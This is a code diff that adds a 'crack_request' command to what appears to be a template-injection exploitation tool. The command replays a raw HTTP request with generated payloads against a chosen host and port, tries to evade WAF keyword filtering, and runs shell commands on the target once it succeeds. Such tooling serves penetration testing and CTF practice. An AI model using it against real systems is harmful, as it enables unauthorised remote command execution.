@@ -2,11 +2,11 @@
 
 """
 import logging
-
+import time
 from urllib.parse import urlparse
 from typing import List, Dict, Tuple, Union
 from functools import partial
-
+from pathlib import Path
 import click
 
 from .const import (
@@ -18,13 +18,27 @@ from .const import (
     STRING,
     DEFAULT_USER_AGENT,
     DETECT_MODE_ACCURATE,
+    PYTHON_VERSION_UNKNOWN,
 )
 from .colorize import colored, set_enable_coloring
 from .cracker import Cracker, EvalArgsModePayloadGen, guess_python_version
 from .form import Form, get_form
 from .full_payload_gen import FullPayloadGen
-from .requester import HTTPRequester
-from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
+from .requester import (
+    HTTPRequester,
+    TCPRequester,
+    check_line_break,
+    fix_line_break,
+    check_tail,
+    fix_tail,
+)
+from .submitter import (
+    Submitter,
+    PathSubmitter,
+    FormSubmitter,
+    TCPSubmitter,
+    shell_tamperer,
+)
 from .scan_url import yield_form
 from .webui import main as webui_main
 from .interact import interact
@@ -168,7 +182,7 @@ def do_crack_form_pre(
     Args:
         url (str): 表单所在的url
         form (Form): 表单
-        requester (Requester): 发起请求的类
+        requester (HTTPRequester): 发起请求的类
         detect_mode (str): 分析模式
         tamper_cmd (Union[str, None]): tamper命令，用于在提交时修改payload
 
@@ -215,7 +229,7 @@ def do_crack_form_eval_args_pre(
     Args:
         url (str): 表单所在的url
         form (Form): 表单
-        requester (Requester): 发起请求的类
+        requester (HTTPRequester): 发起请求的类
         detect_mode (str): 分析模式
         tamper_cmd (Union[str, None]): tamper命令，用于在提交时修改payload
 
@@ -261,7 +275,7 @@ def do_crack_path_pre(
 
     Args:
         url (str): 需要攻击的url
-        requester (Requester): 发送请求的类
+        requester (HTTPRequester): 发送请求的类
         detect_mode (str): 分析模式
         tamper_cmd (Union[str, None]): tamper命令
 
@@ -286,6 +300,39 @@ def do_crack_path_pre(
     if full_payload_gen is None:
         return None
     return full_payload_gen, submitter
+
+
+def do_crack_request_pre(
+    submitter: TCPSubmitter,
+    detect_mode: str,
+    replaced_keyword_strategy: str,
+    environment: str,
+) -> Union[FullPayloadGen, None]:
+    """根据指定的请求文件进行攻击并获得结果
+
+    Args:
+        submitter (TCPSubmitter): 发送payload的类
+        detect_mode (str): 攻击模式
+        replaced_keyword_strategy (str): 被替换关键字的策略
+        environment (str): 模板执行环境
+        tamper_cmd (Union[str, None]): tamper命令
+
+    Returns:
+        Union[FullPayloadGen, None]: 攻击结果
+    """
+    options = Options(
+        detect_mode=detect_mode,
+        replaced_keyword_strategy=replaced_keyword_strategy,
+        environment=environment,
+        python_version=PYTHON_VERSION_UNKNOWN,
+    )
+    cracker = Cracker(submitter=submitter, options=options)
+    if not cracker.has_respond():
+        return None
+    full_payload_gen = cracker.crack()
+    if full_payload_gen is None:
+        return None
+    return full_payload_gen
 
 
 def do_crack(
@@ -580,6 +627,86 @@ def scan(
         return
     logger.warning("Scan failed...")
     raise RunFailed()
+
+
+@main.command()
+@click.option("--host", "-h", help="目标的host，可为IP或域名")
+@click.option("--port", "-p", type=int, help="目标的端口")
+@click.option("--request-file", "-f", help="保存在文本文件中的请求，其中payload处为PAYLOAD")
+@click.option("--toreplace", default=b"PAYLOAD", type=bytes, help="请求文件中payload的占位符")
+@click.option("--ssl/--no-ssl", default=False, help="是否使用SSL")
+@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
+@click.option("--urlencode-payload", default=True, help="是否对payload进行urlencode")
+@click.option("--raw", is_flag=True, default=False, help="是否对payload进行urlencode")
+@click.option(
+    "--detect-mode", default=DETECT_MODE_ACCURATE, help="检测模式，可为accurate或fast"
+)
+@click.option(
+    "--replaced-keyword-strategy",
+    default=REPLACED_KEYWORDS_STRATEGY_AVOID,
+    help="WAF替换关键字时的策略，可为avoid/ignore/doubletapping",
+)
+@click.option(
+    "--environment",
+    default=ENVIRONMENT_JINJA,
+    help="模板的执行环境，默认为flask的render_template_string函数",
+)
+@click.option("--retry-times", default=5, help="重试次数")
+@click.option("--interval", default=0.05, help="请求间隔")
+@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
+def crack_request(
+    host: str,
+    port: int,
+    request_file: str,
+    toreplace: bytes,
+    ssl: bool,
+    exec_cmd: str,
+    urlencode_payload: bool,
+    raw: bool,
+    detect_mode: str,
+    replaced_keyword_strategy: str,
+    environment: str,
+    retry_times: int,
+    interval: float,
+    tamper_cmd: str,
+):
+    request_file = Path(request_file)
+    if not request_file.is_file():
+        logger.error("File doesn't exist: %s", request_file)
+    request_pattern = request_file.read_bytes()
+    if not raw and not check_tail(request_pattern):
+        logger.warning("Request doesn't ends with '\\r\\n\\r\\n', fixing...")
+        logger.warning("You can use `--raw` flag to disable this")
+        request_pattern = fix_tail(request_pattern)
+        time.sleep(2)
+    if not raw and not check_line_break(request_pattern):
+        logger.warning("Request's linebreak is not '\\r\\n', fixing...")
+        logger.warning("You can use `--raw` flag to disable this")
+        request_pattern = fix_line_break(request_pattern)
+        time.sleep(2)
+
+    requester = TCPRequester(
+        host=host, port=port, use_ssl=ssl, retry_times=retry_times, interval=interval
+    )
+    submitter = TCPSubmitter(
+        requester=requester,
+        pattern=request_pattern,
+        toreplace=toreplace,
+        urlencode_payload=urlencode_payload,
+    )
+    if tamper_cmd:
+        tamperer = shell_tamperer(tamper_cmd)
+        submitter.add_tamperer(tamperer)
+    full_payload_gen = do_crack_request_pre(
+        submitter=submitter,
+        detect_mode=detect_mode,
+        replaced_keyword_strategy=replaced_keyword_strategy,
+        environment=environment,
+    )
+    if not full_payload_gen:
+        logger.warning("Crack request failed...")
+        raise RunFailed()
+    do_crack(full_payload_gen, submitter, exec_cmd)
 
 
 @main.command()
